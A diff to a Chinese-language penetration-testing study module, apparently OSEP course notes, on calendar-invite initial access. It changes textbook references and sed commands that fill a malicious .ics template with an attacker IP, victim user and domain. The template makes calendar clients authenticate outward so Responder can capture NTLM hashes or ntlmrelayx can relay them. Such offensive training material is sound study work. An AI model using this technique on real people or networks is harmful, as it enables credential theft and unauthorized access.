@@ -6,7 +6,7 @@
 
 > 一句话：知道收件人地址、目标会处理会议邀请、但没有宏执行机会 → 发一个**引用外部资源**的 `.ics` 邀请，诱使日历客户端在解析/渲染/提醒时主动访问我方资源并发起认证；攻击机侧用 Responder 捕获哈希，或用 ntlmrelayx 直接中继到别的 SMB 目标。
 >
-> 教材第 5 章（Initial Access / 客户端侧）；cheat sheet 关键词：`Relay Attacks`、`Capture Hashes`（见 cheat sheet ~L6207 与 ~L7381）。
+> **教材依据：** 第 5 章（§5.1 日历初始访问向量与 iCalendar RFC 5545、§5.2.1–5.2.2 邀请构造与自动化、§5.2.3 用 Responder 捕获凭据）。捕获后的中继见第 20 章 §20.1.4 与第 22 章 §22.2.2。
 >
 > **核心认知：触发条件取决于日历客户端的版本与配置——"收到邀请 / 被接受" ≠ "会发起认证"。必须先有认证日志证据，再谈后续。**
 
@@ -75,8 +75,9 @@ echo "$TOKEN"                            # 记到笔记，稍后写进 ICS 和�
 
 ```bash
 cd ~/osep/payloads/infra
-sed -e "s/LHOST/192.168.45.10/g" \
-    -e "s|URL|http://192.168.45.10|g" \
+sed -e "/^#/d" \
+    -e "s/LHOST/192.168.45.10/g" \
+    -e "s|https://URL|http://192.168.45.10|g" \
     -e "s/USER/victim/g" -e "s/DOMAIN/corp.local/g" \
     -e "s/TOKEN/${TOKEN}/g" \
     m16-ics-invite.ics \
@@ -120,7 +121,7 @@ nmap -p 445 --script smb2-security-mode TARGET
 # 依赖: 攻击机侧已运行 Responder(收 SMB 认证) 或 ntlmrelayx(中继),
 #       以及可选的 HTTP token 探针 (python3 -m http.server 80)
 # 使用: 先 sed 替换占位符再投递, 例:
-#   sed -e "s/LHOST/192.168.45.10/g" -e "s|URL|http://192.168.45.10|g" \
+#   sed -e "/^#/d" -e "s/LHOST/192.168.45.10/g" -e "s|https://URL|http://192.168.45.10|g" \
 #       -e "s/USER/victim/g" -e "s/DOMAIN/corp.local/g" \
 #       -e "s/TOKEN/m16-3f2a91/g" m16-ics-invite.ics > invite.ics
 #       投递方式: 邮件附件 .ics 或 inline text/calendar; METHOD=REQUEST 是会议请求
@@ -253,7 +254,7 @@ esac
 | `m16-ics-invite.ics` | 引用外部资源的邀请模板（LOCATION=UNC、URL/ATTACH=https token、DESCRIPTION 双引用） | 替换占位符后作为邮件附件/inline 投递 |
 | `m16-auth-capture.sh` | Responder 捕获 / ntlmrelayx 中继一键脚本（含端口占用检查、日志落盘、hashcat 提示） | 每次投递前在攻击机启动 |
 
-相关参考：cheat sheet `Relay Attacks`（~L6207）、`Capture Hashes`（~L7381）；哈希后续利用可参考 [07-credentials-lsass](/zh/modules/07-credentials-lsass) 与 [12-ad-attacks](/zh/modules/12-ad-attacks)。
+相关参考：`pen-300.pdf` 第 5 章 §5.2.3 *Credential Stealing with Responder*；NTLM 中继见第 20 章 §20.1.4 与第 22 章 §22.2.2。哈希后续利用可参考 [07-credentials-lsass](/zh/modules/07-credentials-lsass) 与 [12-ad-attacks](/zh/modules/12-ad-attacks)。
 
 ---
 
